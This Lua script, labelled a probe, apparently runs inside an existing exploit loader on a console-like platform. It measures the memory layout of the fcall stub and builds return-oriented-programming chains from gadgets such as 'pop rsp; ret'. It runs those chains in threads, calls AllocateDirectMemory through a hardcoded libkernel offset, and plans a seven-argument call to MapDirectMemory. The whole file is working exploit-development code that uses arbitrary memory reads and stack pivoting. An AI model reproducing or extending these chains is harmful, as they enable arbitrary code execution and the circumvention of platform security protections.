-- CRASH_CLASS: LOW
-- PROBE 544a: Measure fcall_stub layout + verify pre-built chain in thread:new
--
-- Before attempting MapDirectMemory (7-arg), we need to:
-- 1. Verify ropchain() constructor and push_fcall_raw work from our env
-- 2. Understand the fcall_stub memory layout to know where to put the 7th arg
-- 3. Confirm thread:new(pre_built_chain) executes and returns
--
-- Plan: build a chain that calls getpid (1 arg = 0) via push_fcall_raw,
-- dump the fcall_stub addresses, and run it in a thread.

print("=== PROBE 544a: FCALL STUB LAYOUT ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end

-- [A] Check globals exist
print("[A] globals")
print("  ropchain=" .. type(ropchain))
print("  thread=" .. type(thread))
print("  gadgets=" .. type(gadgets))
print("  fcall=" .. type(fcall))
print("  libc_addrofs=" .. type(libc_addrofs))

if type(ropchain) ~= "table" then
    print("FATAL: ropchain not available")
    return
end
if type(thread) ~= "table" then
    print("FATAL: thread not available")
    return
end

-- make_syscall helper (not a loader global)
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

-- [B] Get bases — libkernel_base is a loader global
print("")
print("[B] bases")
print("  libkernel_base=" .. (libkernel_base and q(libkernel_base) or "NIL"))
print("  eboot_base=" .. (eboot_base and q(eboot_base) or "NIL"))
print("  libc_base=" .. (libc_base and q(libc_base) or "NIL"))
local pid_check = to_num(syscall.getpid())
print("  pid=" .. pid_check)

if not libkernel_base then
    print("FATAL: libkernel_base not available")
    return
end

-- [C] Create ropchain and inspect fcall_stub
print("")
print("[C] ropchain + fcall_stub layout")
local chain = ropchain({ fcall_stub_padding_size = 0x50000 })
print("  chain.stack_base=" .. q(chain.stack_base))
print("  chain.stack_size=" .. chain.stack_size)
print("  fcall_stub.fn_addr=" .. q(chain.fcall_stub.fn_addr))
print("  fcall_stub.return_addr=" .. q(chain.fcall_stub.return_addr))

local fn_addr = chain.fcall_stub.fn_addr
local ret_addr = chain.fcall_stub.return_addr

-- Distance between fn_addr and return_addr
local fn_num = to_num(fn_addr)
local ret_num = to_num(ret_addr)
local gap = ret_num - fn_num
print("  gap (ret - fn) = " .. gap .. " bytes = " .. (gap / 8) .. " qwords")

-- Dump the stub area: 8 qwords starting from fn_addr - 0x10
print("")
print("[C2] stub memory dump (fn_addr-0x10 .. fn_addr+0x38)")
for off = -0x10, 0x38, 8 do
    local addr = fn_addr + uint64(off < 0 and (0x100000000 + off) or off)
    if off < 0 then
        addr = fn_addr - uint64(-off)
    else
        addr = fn_addr + uint64(off)
    end
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then
        local label = ""
        if off == 0 then label = " <-- fn_addr slot" end
        if fn_addr + uint64(off) == ret_addr or (off > 0 and fn_num + off == ret_num) then
            label = " <-- return_addr slot"
        end
        print(string.format("  [fn+0x%02X] %s%s", off, q(val), label))
    else
        print(string.format("  [fn+0x%02X] FAULT", off))
    end
end

-- [D] Test: push_fcall_raw with getpid (0 args, easy)
print("")
print("[D] push_fcall_raw test with getpid")

-- Use libc getpid if available, else use sc_getpid wrapper
local getpid_addr = nil
if libc_addrofs.getpid then
    getpid_addr = libc_addrofs.getpid
    print("  using libc_addrofs.getpid=" .. q(getpid_addr))
elseif syscall.getpid and syscall.getpid.fn_addr then
    getpid_addr = syscall.getpid.fn_addr
    print("  using syscall.getpid.fn_addr=" .. q(getpid_addr))
end

if not getpid_addr then
    print("  no getpid address found, trying Atomic_fetch_add_8 instead")
    -- Fallback: use a known libc function
    -- Just test the chain mechanism with Thrd_exit directly
    print("  SKIP fcall test — will test thread:new with syscall obj")
else
    chain:push_fcall_raw(getpid_addr, function()
        -- no args needed for getpid
    end)
    chain:push_store_retval()
    print("  chain built, stack_offset=" .. chain.stack_offset)
end

-- [E] Test thread:new with syscall (simpler, known-working pattern)
print("")
print("[E] thread:new with syscall obj (getpid)")
local sc_getpid = make_syscall(20)
local ok_t, thr = pcall(function() return thread:new(sc_getpid) end)
print("  thread:new ok=" .. tostring(ok_t))
if ok_t then
    print("  thr.chain.stack_base=" .. q(thr.chain.stack_base))
    print("  running...")
    local ok_r, err_r = pcall(function() thr:run(true) end)
    print("  run ok=" .. tostring(ok_r) .. " err=" .. tostring(err_r))
    if ok_r then
        local ok_j, err_j = pcall(function() thr:join() end)
        print("  join ok=" .. tostring(ok_j) .. " err=" .. tostring(err_j))
        local rv = memory.read_qword(thr.chain:get_last_retval_addr())
        print("  getpid rv=" .. q(rv) .. " (expected ~" .. pid_check .. ")")
    end
end

-- [F] Test thread:new with pre-built chain (our pattern for 7-arg)
print("")
print("[F] thread:new with pre-built chain")
local chain2 = ropchain({ fcall_stub_padding_size = 0x50000 })
-- push a syscall manually: getpid
chain2:push_syscall_with_ret(sc_getpid)
print("  chain2 built, offset=" .. chain2.stack_offset)

local ok_t2, thr2 = pcall(function() return thread:new(chain2) end)
print("  thread:new(chain2) ok=" .. tostring(ok_t2))
if ok_t2 then
    local ok_r2, err_r2 = pcall(function() thr2:run(true) end)
    print("  run ok=" .. tostring(ok_r2) .. " err=" .. tostring(err_r2))
    if ok_r2 then
        local ok_j2, err_j2 = pcall(function() thr2:join() end)
        print("  join ok=" .. tostring(ok_j2) .. " err=" .. tostring(err_j2))
        local rv2 = memory.read_qword(chain2:get_last_retval_addr())
        print("  getpid rv=" .. q(rv2) .. " (expected ~" .. pid_check .. ")")
    end
end

-- [G] Test push_fcall with known libc function (6 args, no 7th)
print("")
print("[G] push_fcall with libc function")
local chain3 = ropchain({ fcall_stub_padding_size = 0x50000 })

-- Use AllocateDirectMemory wrapper (known to work, 6 args via fcall)
local alloc_fn = libkernel_base + uint64(0x17EF0)
local phys_out = memory.alloc(8)
memory.write_qword(phys_out, uint64(0))

-- AllocateDirectMemory(search_start, search_end, len, alignment, memtype, physOut)
chain3:push_fcall_with_ret(alloc_fn,
    uint64(0),                   -- search_start
    uint64("0x150000000"),       -- search_end
    uint64(0x4000),              -- len (1 page)
    uint64(0x4000),              -- alignment
    uint64(0),                   -- memoryType
    uint64(phys_out)             -- output pointer
)
print("  chain3 built, offset=" .. chain3.stack_offset)

local ok_t3, thr3 = pcall(function() return thread:new(chain3) end)
print("  thread:new ok=" .. tostring(ok_t3))
if ok_t3 then
    local ok_r3, err_r3 = pcall(function() thr3:run(true) end)
    print("  run ok=" .. tostring(ok_r3) .. " err=" .. tostring(err_r3))
    if ok_r3 then
        local ok_j3, err_j3 = pcall(function() thr3:join() end)
        print("  join ok=" .. tostring(ok_j3) .. " err=" .. tostring(err_j3))
        local rv3 = memory.read_qword(chain3:get_last_retval_addr())
        print("  AllocDM rv=" .. q(rv3))
        local phys_val = memory.read_qword(phys_out)
        print("  phys=" .. q(phys_val))
    end
end

-- [H] Measure stub for 7th arg placement
print("")
print("[H] 7th arg stub analysis")
-- After push_fcall_raw(MapDM, callback), the stub is:
--   [fn_addr slot]         @ fcall_stub.fn_addr
--   [pop_rsp; ret gadget]  @ fn_addr + 8 (or wherever push_set_rsp puts it)
--   [return_addr value]    @ fcall_stub.return_addr
--
-- When MapDirectMemory executes:
--   [RSP+0] = pop_rsp gadget = return address
--   [RSP+8] = return_addr value = this is what MapDM sees as 7th arg
--
-- To put name=NULL as 7th arg, we need [RSP+8] = 0.
-- But return_addr is the chain resume point, not 0.
--
-- Solution: modify the return path:
--   [fn_addr]             @ fn_addr slot
--   [pop_rbx; ret]        @ fn_addr + 0x08 — return addr for MapDM
--   [0x0000000000000000]  @ fn_addr + 0x10 — 7th arg (name=NULL), popped by pop_rbx (discarded)
--   [pop_rsp; ret]        @ fn_addr + 0x18 — after pop_rbx discards NULL
--   [return_addr]         @ fn_addr + 0x20 — RSP pivot back to main chain
--
-- This requires manually constructing the stub in memory.
-- The standard create_fcall_stub only has 3 slots (fn, pop_rsp, ret_addr).

print("  pop_rbx_ret=" .. q(gadgets["pop rbx; ret"]))
print("  pop_rsp_ret=" .. q(gadgets["pop rsp; ret"]))
print("  ret=" .. q(gadgets["ret"]))

-- Verify these gadgets exist
if not gadgets["pop rbx; ret"] then
    print("  FATAL: no pop_rbx_ret gadget")
    return
end
if not gadgets["pop rsp; ret"] then
    print("  FATAL: no pop_rsp_ret gadget")
    return
end

print("")
print("  7th-arg stub plan:")
print("    fn_addr+0x00: MapDirectMemory address")
print("    fn_addr+0x08: pop_rbx;ret (return addr for MapDM)")
print("    fn_addr+0x10: 0 (7th arg = name NULL, discarded by pop_rbx)")
print("    fn_addr+0x18: pop_rsp;ret")
print("    fn_addr+0x20: chain_resume_addr")
print("  MapDM sees [RSP+0]=pop_rbx = return, [RSP+8]=0 = 7th arg")
print("  MapDM ret -> pop_rbx pops 0, ret -> pop_rsp pops resume, ret -> chain continues")

-- Canary
print("")
local ok_c, pid_c = pcall(function() return to_num(syscall.getpid()) end)
print("canary: ok=" .. tostring(ok_c) .. " pid=" .. tostring(pid_c))

print("=== PROBE 544a COMPLETE ===")
